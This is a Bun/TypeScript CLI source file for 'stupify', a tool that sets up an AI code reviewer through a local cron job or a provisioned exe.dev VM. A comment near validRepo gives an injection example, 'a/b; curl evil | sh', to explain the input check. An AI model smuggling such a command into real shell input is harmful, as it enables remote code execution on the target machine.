#!/usr/bin/env bun
/**
 * stupify — a code reviewer that talks like an idiot and catches real bugs.
 *
 * `stupify` (no args)  → the interactive setup wizard: checks your tools, finds your repo, asks for your
 *                        exe.dev integration, and installs the cron sweep. On exe.dev there are no creds to
 *                        manage (Codex → exe-llm gateway, gh → your GitHub integration).
 * `stupify run [--dry]` → run one review sweep right now.
 */
import { spawnSync } from 'node:child_process'
import { copyFileSync, existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs'
import { homedir } from 'node:os'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { cancel, confirm, intro, isCancel, log, multiselect, note, outro, spinner, text } from '@clack/prompts'
import pc from 'picocolors'

const PKG_DIR = dirname(fileURLToPath(import.meta.url))
const PKG_ROOT = join(PKG_DIR, '..') // the published package root: holds .review/ and packs/
const HOME = process.env.STUPIFY_HOME ?? join(homedir(), '.stupify')
const STATE = join(HOME, 'state')
const REQUIRED = ['bun', 'gh', 'codex', 'git'] as const

// Taste packs: "code like X". Picking one (or several) seeds the corpus, so you don't start from a blank file.
interface Pack {
  id: string
  label: string
  kind: 'taste' | 'perf'
}
const PACKS: Pack[] = [
  { id: 'anton-kropp', label: 'Anton Kropp (devshorts) — DI + branded types', kind: 'taste' },
  { id: 'zod', label: 'Colin McDonnell / Zod — parse, don’t validate', kind: 'taste' },
  { id: 'sindre-sorhus', label: 'Sindre Sorhus — one file, one job', kind: 'taste' },
  { id: 'rich-harris', label: 'Rich Harris / Svelte — compiler-grade precision', kind: 'taste' },
  { id: 'tanner-linsley', label: 'Tanner Linsley / TanStack — types forbid bad states', kind: 'taste' },
  { id: 'mitchell-hashimoto', label: 'Mitchell Hashimoto / Ghostty — documented tradeoffs', kind: 'taste' },
  { id: 'simon-willison', label: 'Simon Willison — one concept per file', kind: 'taste' },
  { id: 'dtolnay', label: 'David Tolnay — the API that disappears (Rust)', kind: 'taste' },
  { id: 'antirez', label: 'antirez / Redis — comments that earn their keep (C)', kind: 'taste' },
  { id: 'dhh', label: 'DHH / Rails — controllers that tell the story (Ruby)', kind: 'taste' },
  { id: 'jarred-sumner', label: 'Jarred Sumner / Bun — perf as correctness', kind: 'perf' },
]

function bail<T>(value: T | symbol): asserts value is T {
  if (isCancel(value)) {
    cancel('aborted.')
    process.exit(0)
  }
}

function die(message: string): never {
  log.error(message)
  process.exit(1)
}

function which(bin: string): string | null {
  return Bun.which(bin)
}

// A bun path the cron can rely on. Under `bunx`, the running bun lives in an EPHEMERAL /tmp/bun-node-… dir
// that's deleted after install — so never bake that into the crontab. Prefer a stable install location.
function stableBun(): string {
  const running = which('bun')
  if (running && !running.includes('/bun-node-') && !running.startsWith('/tmp/')) return running
  for (const c of [join(homedir(), '.bun/bin/bun'), '/usr/local/bin/bun', '/usr/bin/bun']) {
    if (existsSync(c)) return c
  }
  return running ?? 'bun'
}

function detectRepo(): string | null {
  const r = spawnSync('git', ['config', '--get', 'remote.origin.url'], { encoding: 'utf8' })
  if (r.status !== 0) return null
  const slug = (r.stdout ?? '')
    .trim()
    .replace(/^[a-z]+:\/\/[^/]+\//, '')
    .replace(/^git@[^:]+:/, '')
    .replace(/\.git$/, '')
  return validRepo(slug) ? slug : null
}

// Strict owner/repo — GitHub names are word chars / dot / hyphen only. This is also a security boundary:
// `repo` is interpolated into a shell setup-script that runs on the VM, so anything looser than this would
// let `a/b; curl evil | sh` through.
function validRepo(r: string): boolean {
  return /^[\w.-]+\/[\w.-]+$/.test(r)
}

function installCron(opts: { ghHost: string }): string {
  const bun = stableBun()
  const prefix = opts.ghHost ? `GH_HOST=${opts.ghHost} ` : ''
  // No flock — the sweep self-locks (state/sweep.lock), so overlapping cron ticks no-op on their own.
  const line = `*/1 * * * * ${prefix}${bun} ${join(HOME, 'review-sweep.ts')} >> ${STATE}/cron.log 2>&1`
  const current = spawnSync('crontab', ['-l'], { encoding: 'utf8' }).stdout ?? ''
  const kept = current
    .split('\n')
    .filter((l) => l.trim() && !l.includes('review-sweep.ts'))
  const next = [...kept, line].join('\n') + '\n'
  const wrote = spawnSync('crontab', ['-'], { input: next })
  if (wrote.status !== 0) throw new Error('could not write crontab')
  return line
}

// Returns the chosen pack ids. `--pack a,b` (or 'own'/'' = your own codebase) skips the prompt; with --yes and
// no flag it defaults to the devshorts pack so a fresh repo reviews immediately.
async function pickPacks(opts: { yes: boolean; packArg?: string }): Promise<string[]> {
  if (opts.packArg !== undefined) {
    return opts.packArg.split(',').map((s) => s.trim()).filter((id) => id && id !== 'own' && PACKS.some((p) => p.id === id))
  }
  if (opts.yes) return ['anton-kropp']
  const choice = await multiselect({
    message: 'Whose code should yours look like? (pick any — or your own)',
    options: [
      ...PACKS.map((p) => ({ value: p.id, label: p.label, ...(p.kind === 'perf' ? { hint: 'perf' } : {}) })),
      { value: 'own', label: '🧠 my own codebase', hint: 'point CORPUS.md at your files yourself' },
    ],
    required: false,
  })
  bail(choice)
  return choice.filter((v) => v !== 'own')
}

// Build ~/.stupify/.review from the bundled rubric/prompt + the chosen packs' corpus. The engine uses this when
// the target repo has no .review/ of its own — so taste packs work with zero files in your repo.
function assembleReview(packs: string[]): void {
  const out = join(HOME, '.review')
  mkdirSync(out, { recursive: true })
  copyFileSync(join(PKG_ROOT, '.review', 'RUBRIC.md'), join(out, 'RUBRIC.md'))
  copyFileSync(join(PKG_ROOT, '.review', 'REVIEW-PROMPT.md'), join(out, 'REVIEW-PROMPT.md'))
  if (packs.length === 0) {
    copyFileSync(join(PKG_ROOT, '.review', 'CORPUS.md'), join(out, 'CORPUS.md')) // the bring-your-own template
    return
  }
  const header = `# Good-code reference — taste packs\n\nJudge every diff against the standards below. When you flag slop, name the principle (or the linked file) the change should have followed. The links are commit-pinned exemplars — open them when you need detail.\n\n---\n\n`
  const body = packs.map((id) => readFileSync(join(PKG_ROOT, 'packs', `${id}.md`), 'utf8').trim()).join('\n\n---\n\n')
  writeFileSync(join(out, 'CORPUS.md'), `${header}${body}\n`)
}

async function setup(argv: { repo?: string; host?: string; yes: boolean; pack?: string }): Promise<void> {
  console.clear()
  intro(pc.bgMagenta(pc.black(' stupify ')) + pc.dim(' — sounds dumb, reviews sharp'))

  // 1. tools
  const s = spinner()
  s.start('checking your tools')
  const missing = REQUIRED.filter((b) => !which(b))
  if (missing.length) {
    s.stop(pc.red(`missing: ${missing.join(', ')}`))
    note(
      `install them first:\n  bun    → ${pc.cyan('bun.sh')}\n  gh     → ${pc.cyan('cli.github.com')}\n  codex  → ${pc.cyan('github.com/openai/codex')}`,
      'missing tools',
    )
    process.exit(1)
  }
  s.stop(pc.green('bun, gh, codex, git') + pc.dim(' — all here'))

  // 2. repo (auto-detect, else ask)
  let repo = argv.repo ?? ''
  if (!repo) {
    const detected = detectRepo()
    if (detected) {
      if (argv.yes) {
        repo = detected
        log.success(`repo ${pc.bold(detected)} ${pc.dim('(from this checkout)')}`)
      } else {
        const keep = await confirm({ message: `Review ${pc.bold(detected)}? ${pc.dim('(detected from git remote)')}` })
        bail(keep)
        if (keep) repo = detected
      }
    }
  }
  if (!repo) {
    const answer = await text({
      message: 'GitHub repo to review',
      placeholder: 'owner/repo',
      validate: (v) => (validRepo((v ?? '').trim()) ? undefined : 'expected owner/repo'),
    })
    bail(answer)
    repo = answer.trim()
  }
  if (!validRepo(repo)) die(`'${repo}' is not a valid owner/repo`)

  // 3. integration host (exe.dev) — can't be detected
  let host = argv.host ?? process.env.GH_HOST ?? ''
  if (!host && !argv.yes) {
    const answer = await text({
      message: 'exe.dev integration host',
      placeholder: 'your-integration.int.exe.xyz',
      defaultValue: '',
    })
    bail(answer)
    host = answer.trim()
  }

  // 3.5 taste — pick a pack (or your own code)
  const packs = await pickPacks({ yes: argv.yes, packArg: argv.pack })
  const tasteLine = packs.length
    ? PACKS.filter((p) => packs.includes(p.id)).map((p) => p.label.split(' — ')[0]).join(' + ')
    : 'your own codebase'

  // 4. plan + confirm
  note(
    [
      `${pc.dim('repo  ')} ${pc.bold(repo)}`,
      `${pc.dim('taste ')} ${pc.bold(tasteLine)}`,
      host
        ? `${pc.dim('auth  ')} exe.dev integration ${pc.bold(host)} ${pc.dim('— exe-llm gateway, no keys')}`
        : `${pc.dim('auth  ')} your own gh + codex ${pc.dim('(run `gh auth login` first)')}`,
      `${pc.dim('cadence')} every ~60s via cron`,
      `${pc.dim('home  ')} ${HOME}`,
    ].join('\n'),
    'plan',
  )
  if (!argv.yes) {
    const go = await confirm({ message: 'Set it up?' })
    bail(go)
    if (!go) {
      cancel('aborted.')
      process.exit(0)
    }
  }

  // 5. install
  const s2 = spinner()
  s2.start('installing')
  mkdirSync(STATE, { recursive: true })
  copyFileSync(join(PKG_DIR, 'review-sweep.ts'), join(HOME, 'review-sweep.ts'))
  assembleReview(packs)
  const cfg = [`REPO_SLUG=${repo}`, host ? `GH_HOST=${host}` : '', '# tune anything else here — see the README']
    .filter(Boolean)
    .join('\n')
  writeFileSync(join(HOME, 'config.env'), cfg + '\n')
  installCron({ ghHost: host })
  s2.stop(pc.green('installed') + pc.dim(` → ${HOME}`))

  // 6. success
  const preview = `${pc.dim('preview anytime:')} ${pc.cyan(`DRY_RUN=1 bun ${join(HOME, 'review-sweep.ts')}`)}`
  if (packs.length) {
    note(
      [
        `reviewing ${pc.bold(repo)} against ${pc.bold(tasteLine)}.`,
        `label any open PR ${pc.cyan('codex-review')} ${pc.dim('(or add .github/workflows/autolabel.yml)')} → a review in ~60s.`,
        ``,
        `want your OWN taste instead? add a ${pc.cyan('.review/')} to ${pc.bold(repo)} — it overrides the pack.`,
        preview,
      ].join('\n'),
      "you're set",
    )
  } else {
    note(
      [
        `${pc.bold('1.')} add a ${pc.cyan('.review/')} to ${pc.bold(repo)} and point ${pc.cyan('CORPUS.md')} at YOUR best files`,
        `${pc.bold('2.')} label any open PR ${pc.cyan('codex-review')} ${pc.dim('(or add autolabel.yml)')} → a review in ~60s`,
        ``,
        preview,
      ].join('\n'),
      'two steps to your first review',
    )
  }
  outro(pc.green('stupify is watching ') + pc.bold(repo) + pc.green(' 👀'))
}

function run(dry: boolean): void {
  const sweep = join(HOME, 'review-sweep.ts')
  if (!Bun.file(sweep).size) {
    log.error(`not set up yet — run ${pc.cyan('stupify')} first`)
    process.exit(1)
  }
  const env = { ...process.env, ...(dry ? { DRY_RUN: '1' } : {}) }
  const r = spawnSync('bun', [sweep], { stdio: 'inherit', env })
  process.exit(r.status ?? 1)
}

// --- provision: spin up an exe.dev VM that runs stupify, from your laptop ---

function exe(args: string[], input = ''): { ok: boolean; out: string } {
  const r = spawnSync('ssh', ['-o', 'ConnectTimeout=25', 'exe.dev', ...args], {
    input,
    encoding: 'utf8',
    maxBuffer: 8 * 1024 * 1024,
  })
  return { ok: r.status === 0, out: (r.stdout ?? '') + (r.stderr ?? '') }
}

function githubIntegrationFor(repo: string): string | null {
  const r = exe(['int', 'list', '--json'])
  if (!r.ok) return null
  try {
    const list: { name: string; type: string; config?: { repositories?: string[] } }[] = JSON.parse(r.out)
    return list.find((i) => i.type === 'github' && (i.config?.repositories ?? []).includes(repo))?.name ?? null
  } catch {
    return null
  }
}

const vmNameFor = (repo: string): string => 'stupify-' + repo.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '')

async function provision(argv: { repo?: string; yes: boolean; pack?: string }): Promise<void> {
  console.clear()
  intro(pc.bgMagenta(pc.black(' stupify ')) + pc.dim(' — provision a reviewer on exe.dev'))

  // 1. onboarded to exe.dev?
  const s = spinner()
  s.start('checking exe.dev')
  const who = exe(['whoami'])
  if (!who.ok) {
    s.stop(pc.red('not connected to exe.dev'))
    note(`onboarding is one step — run this once, then re-run stupify:\n\n  ${pc.cyan('ssh exe.dev')}`, 'connect exe.dev')
    process.exit(1)
  }
  s.stop(pc.green('exe.dev ready') + pc.dim(` — ${(who.out.match(/[\w.+-]+@[\w.-]+/) ?? [''])[0]}`))

  // 2. repo (auto-detect, else ask)
  let repo = argv.repo ?? ''
  if (!repo) {
    const detected = detectRepo()
    if (detected) {
      if (argv.yes) repo = detected
      else {
        const keep = await confirm({ message: `Review ${pc.bold(detected)}? ${pc.dim('(detected from git remote)')}` })
        bail(keep)
        if (keep) repo = detected
      }
    }
  }
  if (!repo) {
    const answer = await text({
      message: 'GitHub repo to review',
      placeholder: 'owner/repo',
      validate: (v) => (validRepo((v ?? '').trim()) ? undefined : 'expected owner/repo'),
    })
    bail(answer)
    repo = answer.trim()
  }
  if (!validRepo(repo)) die(`'${repo}' is not a valid owner/repo`)

  // 2.5 taste — pick a pack (or your own code); the VM installs it on first boot
  const packs = await pickPacks({ yes: argv.yes, packArg: argv.pack })

  // 3. GitHub integration — reuse an existing one, else create it (needs your GitHub linked once, on the web)
  const s2 = spinner()
  s2.start('finding your GitHub integration')
  let integration = githubIntegrationFor(repo)
  if (integration) {
    s2.stop(pc.green(`using integration ${pc.bold(integration)}`))
  } else {
    const name = vmNameFor(repo)
    const add = exe(['integrations', 'add', 'github', '--name', name, '--repository', repo])
    if (add.ok) {
      integration = name
      s2.stop(pc.green(`created integration ${pc.bold(name)}`))
    } else {
      s2.stop(pc.red(`no GitHub integration for ${repo}`))
      note(`link your GitHub account once (web), then re-run stupify:\n\n  ${pc.cyan('https://exe.dev/integrations')}\n\n${pc.dim(add.out.trim().slice(0, 200))}`, 'connect GitHub')
      process.exit(1)
    }
  }
  const host = `${integration}.int.exe.xyz`
  const tasteLine = packs.length
    ? PACKS.filter((p) => packs.includes(p.id)).map((p) => p.label.split(' — ')[0]).join(' + ')
    : 'your own codebase'

  // 4. plan + confirm
  note(
    [
      `${pc.dim('repo ')}  ${pc.bold(repo)}`,
      `${pc.dim('taste')}  ${pc.bold(tasteLine)}`,
      `${pc.dim('vm   ')}  a small always-on exe.dev VM on your account`,
      `${pc.dim('auth ')}  integration ${pc.bold(integration)} ${pc.dim('— no keys, no tokens')}`,
    ].join('\n'),
    'plan',
  )
  if (!argv.yes) {
    const go = await confirm({ message: 'Provision it?' })
    bail(go)
    if (!go) {
      cancel('aborted.')
      process.exit(0)
    }
  }

  // 5. create the VM with a first-boot setup-script that installs stupify
  const s3 = spinner()
  s3.start('provisioning VM + installing stupify')
  const vm = vmNameFor(repo)
  const script = [
    'export PATH="$HOME/.bun/bin:/usr/local/bin:$PATH"',
    'command -v bun >/dev/null 2>&1 || curl -fsSL https://bun.sh/install | bash',
    'export PATH="$HOME/.bun/bin:$PATH"',
    `exec bunx github:Octember/stupify setup ${repo} --host ${host} --pack ${packs.join(',') || 'own'} --yes`,
  ].join('\n')
  const created = exe(['new', '--name', vm, '--integration', integration, '--json', '--setup-script', '/dev/stdin'], script)
  if (!created.ok) {
    s3.stop(pc.red('provision failed'))
    log.error(created.out.trim().slice(0, 400))
    process.exit(1)
  }
  let dest = `${vm}.exe.xyz`
  try {
    dest = (JSON.parse(created.out) as { ssh_dest?: string }).ssh_dest ?? dest
  } catch {
    /* keep the derived dest */
  }
  s3.stop(pc.green(`VM ${pc.bold(vm)} created`) + pc.dim(` (${dest})`))

  // 6. success
  const firstReview = packs.length
    ? [
        `reviewing ${pc.bold(repo)} against ${pc.bold(tasteLine)}.`,
        `label any open PR ${pc.cyan('codex-review')} ${pc.dim('(or add .github/workflows/autolabel.yml)')} → a review in ~60s.`,
        ``,
        `want your OWN taste? add a ${pc.cyan('.review/')} to ${pc.bold(repo)} — it overrides the pack.`,
      ]
    : [
        `${pc.bold('1.')} add a ${pc.cyan('.review/')} dir to ${pc.bold(repo)} — copy this repo's .review/, point CORPUS.md at YOUR best files`,
        `${pc.bold('2.')} label any open PR ${pc.cyan('codex-review')} ${pc.dim('(or add .github/workflows/autolabel.yml)')}`,
      ]
  note(
    [
      `${pc.bold(vm)} is booting and installing stupify ${pc.dim('(~15s)')}.`,
      ``,
      ...firstReview,
      ``,
      `${pc.dim('watch:')} ${pc.cyan(`ssh ${dest} 'tail -f ~/.stupify/state/sweep.log'`)}`,
      `${pc.dim('stop: ')} ${pc.cyan(`ssh exe.dev rm ${vm}`)}`,
    ].join('\n'),
    'done',
  )
  outro(pc.green('stupify is provisioned for ') + pc.bold(repo) + pc.green(' 👀'))
}

function help(): void {
  console.log(`${pc.bold('stupify')} — a code reviewer that talks like an idiot and catches real bugs

${pc.dim('Usage')} ${pc.dim('(run from your laptop)')}
  stupify                 provision an exe.dev VM that reviews your repo ${pc.dim('(the magic)')}
  stupify <owner/repo>    provision for a specific repo
  stupify setup [repo]    install on THIS machine instead of provisioning a VM
  stupify run [--dry]     run one review sweep now (where stupify is installed)
  stupify --help

${pc.dim('Flags')}
  --host <h.int.exe.xyz>  integration host (for 'setup')
  --pack <a,b,...>        taste packs to review against (e.g. anton-kropp,zod); 'own' = bring your own .review/
  --yes, -y               accept detected defaults, no prompts (for CI / scripts)

${pc.dim("Provisioning rides exe.dev — onboard once with 'ssh exe.dev', then one command does the rest.")} https://stupif.ai`)
}

// --- routing ---
const args = process.argv.slice(2)
const yes = args.includes('--yes') || args.includes('-y')
const valueFlag = (name: string) => {
  const i = args.indexOf(name)
  return i >= 0 ? args[i + 1] : undefined
}
const host = valueFlag('--host')
const pack = valueFlag('--pack')
const positional = args.filter((a, i) => !a.startsWith('-') && args[i - 1] !== '--host' && args[i - 1] !== '--pack')
const cmd = positional[0]

if (args.includes('-h') || args.includes('--help')) {
  help()
} else if (cmd === 'run') {
  run(args.includes('--dry'))
} else if (cmd === 'setup') {
  await setup({ repo: positional[1], host, yes, pack })
} else {
  // default (and explicit `provision`): provision an exe.dev VM
  await provision({ repo: cmd === 'provision' ? positional[1] : cmd, yes, pack })
}
